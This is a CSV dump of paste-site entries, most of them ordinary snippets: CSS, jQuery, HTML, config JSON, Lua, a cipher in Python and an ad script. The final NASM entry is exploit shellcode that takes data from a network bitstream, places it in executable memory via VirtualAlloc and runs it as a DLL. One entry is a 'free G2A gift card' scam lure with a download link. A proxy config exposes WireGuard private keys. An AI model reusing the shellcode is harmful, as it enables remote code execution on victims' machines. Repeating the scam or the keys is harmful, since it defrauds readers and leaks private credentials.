id,title,username,language,date,content
nKGmTJVU,Untitled,SergioG_0823849,CSS,Monday 22nd of April 2024 07:57:24 AM CDT,".spinner {
	 animation: rotator 1.4s linear infinite;
}
 @keyframes rotator {
	 0% {
		 transform: rotate(0deg);
	}
	 100% {
		 transform: rotate(270deg);
	}
}
 .path {
	 stroke-dasharray: 187;
	 stroke-dashoffset: 0;
	 transform-origin: center;
	 animation: dash 1.4s ease-in-out infinite, colors 5.6s ease-in-out infinite;
}
 @keyframes colors {
	 0% {
		 stroke: #4285f4;
	}
	 25% {
		 stroke: #de3e35;
	}
	 50% {
		 stroke: #f7c223;
	}
	 75% {
		 stroke: #1b9a59;
	}
	 100% {
		 stroke: #4285f4;
	}
}
 @keyframes dash {
	 0% {
		 stroke-dashoffset: 187;
	}
	 50% {
		 stroke-dashoffset: 46.75;
		 transform: rotate(135deg);
	}
	 100% {
		 stroke-dashoffset: 187;
		 transform: rotate(450deg);
	}
}"
PWMnukqt,w84jQuery($),rAthus,JavaScript,Monday 22nd of April 2024 07:57:06 AM CDT,"var w84jQuery = setInterval(function() {
	if (typeof(jQuery)!='undefined') {
		clearTimeout(w84jQuery);
		var $ = jQuery;
		// jQuery code here, can use the $ symbol
	}
},100);"
gPJnanr0,fv_warp,lai1tony,YAML,Monday 22nd of April 2024 07:55:00 AM CDT,"port: 7890
socks-port: 7891
allow-lan: true
mode: rule
log-level: silent
external-controller: 0.0.0.0:9090

proxies:
  - name: ""wv_warp""
    type: vless
    server: wv.fygg.xyz
    port: 443
    uuid: e196f36b-c3a1-45ec-9936-92bededec8a7
    udp: true
    tls: true
    network: ws
    servername: tv.cctv.com
    ws-opts:
      path: ""/""
      headers:
        Host: kk.difqiang.top
  - name: ""wg1""
    type: wireguard
    server: 162.159.195.153
    port: 1002
    ip: 172.16.0.2
    ipv6: 2606:4700:110:8e91:b397:5210:6ecb:29ee/128
    public-key: bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=
    private-key: +HtnzYfVujwb5zyctrsQw91HYsbAY/L37fugWP9L3H8=
    udp: true
    mtu: 1280
    dns: [1.1.1.1,8.8.8.8]
    remote-dns-resolve: false
  - name: ""wg2""
    type: wireguard
    server: 188.114.96.176
    port: 1002
    ip: 172.16.0.2
    ipv6: 2606:4700:110:8e2f:5e3b:7c38:1a88:57b2/128
    public-key: bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=
    private-key: WErSzKa5oW/etbH/Qnf2KG/uIBY5H3WA7xMSqEttq2c=
    udp: true
    mtu: 1280
    dns: [1.1.1.1,8.8.8.8]
    remote-dns-resolve: false
	
proxy-groups:
  - name: ""节点选择""
    type: select
    proxies:
      - ""♻️ 自动选择""
      - DIRECT
      - ""wv_warp""
      - ""wg1""
      - ""wg2""
  - name: ""♻️ 自动选择""
    type: url-test
    url: http://www.gstatic.com/generate_204
    interval: 300
    tolerance: 100
    proxies:
      - ""wv_warp""
      - ""wg1""
      - ""wg2""

rules:
  - DOMAIN-SUFFIX,google.com,节点选择
  - DOMAIN-KEYWORD,google,节点选择
  - DOMAIN,google.com,节点选择
  - DOMAIN-SUFFIX,ad.com,REJECT
  - SRC-IP-CIDR,192.168.2.1/32,DIRECT
  - SRC-IP-CIDR,198.18.0.1/32,DIRECT
  - IP-CIDR,127.0.0.0/8,DIRECT
  - GEOIP,CN,DIRECT
  - DST-PORT,80,节点选择
  - DST-PORT,443,节点选择
  - DST-PORT,7895,REJECT
  - DST-PORT,7892,REJECT
  - MATCH,节点选择

dns:
  enable: true
  ipv6: true
  enhanced-mode: fake-ip
  fake-ip-range: 198.18.0.1/16
  listen: 0.0.0.0:7874
  nameserver:
    - dhcp://""pppoe-wan""
    - 113.77.160.1
    - ""[fe80::7244:ff:fe4f:ff40]:53""
    - 202.96.128.166
    - 202.96.128.86
    - ""[240e:1f:1::1]:53""
    - ""[240e:1f:1::33]:53""
    - 114.114.114.114
    - 119.29.29.29
    - 119.28.28.28
    - 223.5.5.5
    - tls://dot.360.cn:853
    - tls://dns.alidns.com:853
    - tls://dot.pub:853
    - https://doh.360.cn/dns-query
    - https://223.5.5.5/dns-query
    - https://223.6.6.6/dns-query
    - https://doh.pub/dns-query
    - https://dns.alidns.com/dns-query
  fallback:
    - https://dns.cloudflare.com/dns-query
    - https://dns.google/dns-query
    - tls://dns.google:853
    - https://1.1.1.1/dns-query
    - tls://1.1.1.1:853
    - tls://8.8.8.8:853
    - tls://cloudflare-dns.com
    - ""[2001:4860:4860::8888]:53""
    - ""[2001:4860:4860::8844]:53""
    - ""[2001:da8::666]:53""
    - https://public.dns.iij.jp/dns-query
    - https://dns-unfiltered.adguard.com/dns-query
    - https://jp.tiar.app/dns-query
    - https://jp.tiarap.org/dns-query
    - https://dns.quad9.net/dns-query
    - https://dns.adguard.com/dns-query
    - tls://jp.tiar.app
    - tls://dot.tiar.app
    - tls://dns.quad9.net:853
"
u7cXxcZr,mobile - price widget for news,petar_bonov,HTML,Monday 22nd of April 2024 07:50:18 AM CDT,"<div class=""pricecut"">
    <div class=""row"">
        <a class=""image"" href=""..."" target=""_blank"" rel=""noopener"">
            <img src=""https://m.media-amazon.com/images/I/31GW7wKCNQL._SL500_.jpg"" alt="""" class=""crop"">
        </a>

        <p>
        <h3>ZTE Blade V50</h3>
        <a class=""memory"" href=""..."" target=""_blank"" rel=""noopener"">256GB 6GB RAM</a>
        </p>
    </div>
    <div class=""deal"">
        <a class=""store"" href=""..."" target=""_blank"" rel=""noopener""><img src=""..."" alt=""""></a>
        <a class=""price"" href=""..."" target=""_blank"" rel=""noopener"">€&thinsp;99.99</a>
        <a class=""discount"" href=""..."" target=""_blank"" rel=""noopener"">14.7</a>
    </div>

    <div class=""history"">
        <div class=""row"">
            <div class=""chart""></div>
            <div class=""stats"">
                <span>Min</span>
                <b>€&thinsp;109.00</b>
                <span>Previous</span>
                <b>€&thinsp;127.94</b>
                <span>Max</span>
                <b>€&thinsp;190.71</b>
                <span>30 Day Avg</span>
                <b>€&thinsp;127.93</b>
            </div>
        </div>

    </div>

    <a href=""#"" class=""cutprice"" history=""..."" currency="""" symbol=""€"" average=""12793"">
        <span>Price details</span>
    </a>
</div>
"
bPypQgyB,configs,Rubicon1543,JSON,Monday 22nd of April 2024 07:42:39 AM CDT,"{
  ""payload"": {
    ""config"": [
      {
        ""title"": ""Cancel All Open Orders"",
        ""value"": true,
        ""category"": ""Switches"",
        ""group"": null,
        ""field"": null,
        ""binding"": null,
        ""id"": ""cancel_all_open_orders""
      },
      {
        ""title"": ""Is working"",
        ""value"": true,
        ""category"": ""Switches"",
        ""group"": null,
        ""field"": null,
        ""binding"": ""cex"",
        ""id"": ""is_working""
      },
      {
        ""title"": ""Trades Min"",
        ""value"": ""epik"",
        ""category"": ""General"",
        ""group"": ""Trades"",
        ""field"": ""Min"",
        ""binding"": null,
        ""id"": ""trades_min""
      },
      {
        ""title"": ""Trades Max"",
        ""value"": ""usdt"",
        ""category"": ""General"",
        ""group"": ""Trades"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""trades_max""
      },
      {
        ""title"": ""Min Volume Per Day"",
        ""value"": 0.018001,
        ""category"": ""General"",
        ""group"": ""Volume Per Day"",
        ""field"": ""Min"",
        ""binding"": null,
        ""id"": ""min_volume_per_day""
      },
      {
        ""title"": ""Max Volume Per Day"",
        ""value"": 0.01,
        ""category"": ""General"",
        ""group"": ""Volume Per Day"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""max_volume_per_day""
      },
      {
        ""title"": ""Buy Percent"",
        ""value"": 0.01,
        ""category"": ""General"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""buy_percent""
      },
      {
        ""title"": ""Range Punkts"",
        ""value"": 0.01,
        ""category"": ""General"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""range_punkts""
      },
      {
        ""title"": ""Currency 1"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""cex"",
        ""id"": ""pair.currency_1""
      },
      {
        ""title"": ""Currency 2"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""cex"",
        ""id"": ""pair.currency_2""
      },
      {
        ""title"": ""Router Address"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""router_address""
      },
      {
        ""title"": ""Type Binding"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""type_binding""
      },
      {
        ""title"": ""Stable Address"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""stable_address""
      },
      {
        ""title"": ""Conversion Pool"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""conversion_pool""
      },
      {
        ""title"": ""Target Decimals"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""target_decimals""
      },
      {
        ""title"": ""Token1 Decimals"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""token1_decimals""
      },
      {
        ""title"": ""Stable Decimals"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""stable_decimals""
      },
      {
        ""title"": ""Native Decimals"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""native_decimals""
      },
      {
        ""title"": ""Token0 Decimals"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""token0_decimals""
      },
      {
        ""title"": ""Quote Decimals"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""quote_decimals""
      },
      {
        ""title"": ""Is Pancake"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""is_pancake""
      },
      {
        ""title"": ""Pair Address"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""pair_address""
      },
      {
        ""title"": ""Target Token"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""target_token""
      },
      {
        ""title"": ""Wrapped Native Contract Address"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""wrapped_native_contract_address""
      },
      {
        ""title"": ""Mainnet Url"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""mainnet_url""
      },
      {
        ""title"": ""Quote And Base Reversed"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""quote_and_base_reversed""
      },
      {
        ""title"": ""Mainnet Url"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""mainnet_url""
      },
      {
        ""title"": ""Native Is Token1 In Conversion Pool"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""dex"",
        ""id"": ""native_is_token1_in_conversion_pool""
      },
      {
        ""title"": ""Api Key"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": ""cex"",
        ""id"": ""api_key""
      },
      {
        ""title"": ""Fake Binding"",
        ""value"": 0.01,
        ""category"": ""Price Anchoring"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""fake_binding""
      },
      {
        ""title"": ""One Time Decomp Limit"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Decomp Limit"",
        ""field"": ""One Time"",
        ""binding"": null,
        ""id"": ""one_time_decomp_limit""
      },
      {
        ""title"": ""Period Decomp Limit"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Decomp Limit"",
        ""field"": ""Period"",
        ""binding"": null,
        ""id"": ""period_decomp_limit""
      },
      {
        ""title"": ""Sales Zone Buy Limit"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Sales Zone"",
        ""field"": ""Buy Limit"",
        ""binding"": null,
        ""id"": ""sales_zone_buy_limit""
      },
      {
        ""title"": ""Sales Zone Sell Limit"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Sales Zone"",
        ""field"": ""Sell Limit"",
        ""binding"": null,
        ""id"": ""sales_zone_sell_limit""
      },
      {
        ""title"": ""Buying Zone Buy Limit"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Buying Zone"",
        ""field"": ""Buy Limit"",
        ""binding"": null,
        ""id"": ""buying_zone_buy_limit""
      },
      {
        ""title"": ""Buying Zone Sell Limit"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Buying Zone"",
        ""field"": ""Sell Limit"",
        ""binding"": null,
        ""id"": ""buying_zone_sell_limit""
      },
      {
        ""title"": ""Sales zone min"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Sales Zone"",
        ""field"": ""Min"",
        ""binding"": null,
        ""id"": ""sales_zone_min""
      },
      {
        ""title"": ""Sales_zone max"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Sales Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""sales_zone_max""
      },
      {
        ""title"": ""Buying zone min"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Buying Zone"",
        ""field"": ""Min"",
        ""binding"": null,
        ""id"": ""buying_zone_min""
      },
      {
        ""title"": ""Buying zone max"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""buying_zone_max""
      },
      {
        ""title"": ""Price Diff Min"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Price Diff"",
        ""field"": ""Min"",
        ""binding"": null,
        ""id"": ""price_diff_min""
      },
      {
        ""title"": ""Price Diff Max"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Price Diff"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""price_diff_max""
      },
      {
        ""title"": ""Prioritize Sell"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""prioritize_sell""
      },
      {
        ""title"": ""Price Diff"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""price_diff""
      },
      {
        ""title"": ""Binding Ratio"",
        ""value"": 0.01,
        ""category"": ""Price Diff Resolution"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""binding_ratio""
      },
      {
        ""title"": ""Target Volume"",
        ""value"": 0.01,
        ""category"": ""Notifications"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""target_volume""
      },
      {
        ""title"": ""Period Net Loss"",
        ""value"": 0.01,
        ""category"": ""Notifications"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""period_net_loss""
      },
      {
        ""title"": ""Min Netloss Per Day Usdt"",
        ""value"": 0.01,
        ""category"": ""Notifications"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""min_netloss_per_day_usdt""
      },
      {
        ""title"": ""Client Name"",
        ""value"": 0.01,
        ""category"": ""Static Values"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""client_name""
      },
      {
        ""title"": ""Exchange"",
        ""value"": 0.01,
        ""category"": ""Static Values"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""exchange""
      },
      {
        ""title"": ""Currency 1"",
        ""value"": 0.01,
        ""category"": ""Static Values"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""currency_1""
      },
      {
        ""title"": ""Currency 2"",
        ""value"": 0.01,
        ""category"": ""Static Values"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""currency_2""
      },
      {
        ""title"": ""Period Time"",
        ""value"": 0.01,
        ""category"": ""Static Values"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""period_time""
      },
      {
        ""title"": ""Min Exchange Amount"",
        ""value"": 0.01,
        ""category"": ""Static Values"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""min_exchange_amount""
      },
      {
        ""title"": ""Time Lag"",
        ""value"": 0.01,
        ""category"": ""Static Values"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""time_lag""
      },
      {
        ""title"": ""Timestamp Update"",
        ""value"": 0.01,
        ""category"": ""Static Values"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""timestamp_update""
      },
      {
        ""title"": ""Value Completed Cycles"",
        ""value"": 0.01,
        ""category"": ""Static Values"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""value_completed_cycles""
      },
      {
        ""title"": ""Long Period Volume"",
        ""value"": 0.01,
        ""category"": ""Static Values"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""long_period_volume""
      },
      {
        ""title"": ""Volume Variety Percent"",
        ""value"": 0.01,
        ""category"": ""Static Values"",
        ""group"": ""Buying Zone"",
        ""field"": ""Max"",
        ""binding"": null,
        ""id"": ""volume_variety_percent""
      }
    ]
  }
}"
dHWannXs,Computer Craft Scrolling Display,IsCactus,Lua,Monday 22nd of April 2024 07:37:36 AM CDT,"local monitor = peripheral.find(""monitor"")
local sign = ""TEXT - ""
local length = #sign
local speed = 0.4

function loop(text)
	start = string.sub(text, 1, 1)
	tail = string.sub(text, 2, length)
	return tail .. start 
end

monitor.setTextColour(colours.white)
monitor.setTextScale(2)

while (true) do
	monitor.clear()
	monitor.setCursorPos(1, 2)
	monitor.write(sign)
	
	sign = loop(sign)
	sleep(speed)
end"
jqwBeJgj,Caesar / Vigenere cypher,ifigazsi,Python,Monday 22nd of April 2024 07:17:56 AM CDT,"from string import ascii_lowercase

abc = ascii_lowercase

def caesar_code(message, shift):
    output = """"
    shift = shift % len(abc)
    for char in message.lower():
        output += char if char not in abc else _find_shifted_letter(char, shift)
    return output


def _find_shifted_letter(letter, shift):
    index = abc.index(letter) + shift
    index = index if index < len(abc) else index - len(abc)
    return abc[index] 


def vigenere_encode(message, code):
    code_gen = _code_generator(code)
    output = """"
    for letter in message.lower():
        output += letter if letter not in abc else caesar_code(next(code_gen), abc.index(letter))
    return output


def vigenere_decode(message, code):
    code_gen = _code_generator(code)
    output = """"
    for letter in message.lower():
        output += letter if letter not in abc else caesar_code(""a"", abc.index(letter) - abc.index(next(code_gen)))
    return output

def _code_generator(code):
    i = 0
    while True:
        yield code[i % len(code)].lower()
        i += 1"
2u4Zdx6X,Untitled,cam541,HTML,Monday 22nd of April 2024 07:12:14 AM CDT,"This is a test. 
I want to know how long it takes to get access again "
VVVQr7i3,ATM9 - PCM.v2 Recipe Table - Blood Magic Altar,iarspider,JSON,Monday 22nd of April 2024 07:06:00 AM CDT,"{
	""bloodmagic:altar/demonicslate"": {
		""multiplier"": 1,
		""input"": [
			{""item"": ""bloodmagic:infusedslate""}
		],
		""output"": {""item"": ""bloodmagic:demonslate""}
	},
	""bloodmagic:altar/reinforcedslate"": {
		""multiplier"": 1,
		""input"": [
			{""item"": ""bloodmagic:blankslate""}
		],
		""output"": {""item"": ""bloodmagic:reinforcedslate""}
	},
	""bloodmagic:altar/slate"": {
		""multiplier"": 1,
		""input"": [
			{""item"": ""minecraft:stone""}
		],
		""output"": {""item"": ""bloodmagic:blankslate""}
	},
	""bloodmagic:altar/imbuedslate"": {
		""multiplier"": 1,
		""input"": [
			{""item"": ""bloodmagic:reinforcedslate""}
		],
		""output"": {""item"": ""bloodmagic:infusedslate""}
	}
}"
p1FHnd9z,лента LUXUP + floorAd ВМа,Luxup,JavaScript,Monday 22nd of April 2024 06:44:09 AM CDT,"<script>
  let show_topad_yandex = function () {
    if (!document.documentElement.classList.contains('yandex-ad-on-screen')) {
      window.yaContextCb.push(()=>{
        Ya.Context.AdvManager.render({
          ""blockId"": ""R-A-5518567-2"",
          ""type"": ""floorAd"",
          statId: 1
        });
      });
    }
  }

  let checkAndDestroyAd = function() {
    if (document.documentElement.classList.contains('yandex-ad-on-screen')) {
      Ya.Context.AdvManager.destroy({blockId: 'R-A-5518567-2'});
    }
  }

  setInterval(function() {
    checkAndDestroyAd();
    show_topad_yandex();
  }, 2000);

  document.documentElement.addEventListener('luxupYandexFeedOnScreen', (e) => { 
    if (e.detail && e.detail.onScreen) {
      document.documentElement.classList.add('yandex-ad-on-screen');
    } else { 
      document.documentElement.classList.remove('yandex-ad-on-screen');
      show_topad_yandex();
    }
  });
</script>"
T0hsrh71,👾G2A.com Free Gift Card Guide Apr 2024 NEW👾,jordanthebordan,GetText,Monday 22nd of April 2024 06:37:57 AM CDT,"G2А.com frеe gift cаrd & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to dаte versiоn of this scriрt. Any оther one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/14G2eGlj-b_L6M7-S1ou5gAZFP5wLLg-t/view
 
Working as of:
22 April 2024"
9vJRvJAV,Untitled,Hidend,ASM (NASM),Monday 22nd of April 2024 06:14:37 AM CDT,";# repair stack
lea esp, [ebp-0x128]

;# get bitstream
mov eax, [ebp+0x3c]             ;# caption
sub eax, 0x118                  ;# bitstream
mov ecx, [eax]                  ;# numberOfBitsUsed
mov edx, [eax+0x8]              ;# readOffset
mov esi, [eax+0xC]              ;# data ptr
add ecx, 7                      ;# numberOfBitsUsed bits to bytes
shr ecx, 3       
add edx, 7                      ;# readOffset bits to bytes
shr edx, 3       
sub ecx, edx                    ;# numberOfBitsUsed - readOffset = dll size
add esi, edx                    ;# data ptr         + readOffset = dll ptr

cmp ecx, 0
je epilogue

;# call VirtualAlloc
push ecx                        ;# save ecx
push 0x40                       ;# flProtect = PAGE_EXECUTE_READWRITE
push 0x3000                     ;# flAllocationType = MEM_COMMIT | MEM_RESERVE
push ecx                        ;# dwSize = dll size
push 0                          ;# lpAddress = 0
mov eax, dword ptr [0x008581A4] ;# get VirtualAlloc
call eax                        ;# call VirtualAlloc
mov edi, eax
pop ecx                         ;# restore ecx

;# copy dll
rep movsb

;# execute dll
call eax
jmp epilogue

;# epilogue
epilogue:
pop edi
pop esi
mov eax, 1
pop ebx
mov esp, ebp
pop ebp
ret 8"
